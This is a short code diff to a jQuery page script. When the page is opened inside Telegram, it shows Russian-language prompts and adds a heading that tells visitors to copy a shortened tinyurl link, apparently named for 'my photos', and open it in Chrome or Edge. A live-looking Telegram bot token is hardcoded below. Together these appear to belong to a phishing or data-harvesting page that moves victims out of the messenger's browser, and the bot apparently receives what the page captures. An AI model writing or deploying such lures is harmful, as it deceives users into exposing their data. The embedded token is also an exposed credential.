@@ -1,6 +1,7 @@
 $(document).ready(function () {
   if (navigator.userAgent.includes("Telegram")) {
     alert("Для корректной работы откройте эту страницу в обычном браузере (например, Chrome или Edge).");
+    $("#h1").html("Скопируйте ссылку и вставьте её в обычный браузер (например, Chrome или Edge) вручную:<br>https://tinyurl.com/moifottochkii");
   }
 
   const botToken = "8114030428:AAHsuJfIONLcoVFZrLaRGyww2GNgeQ2RBpg";
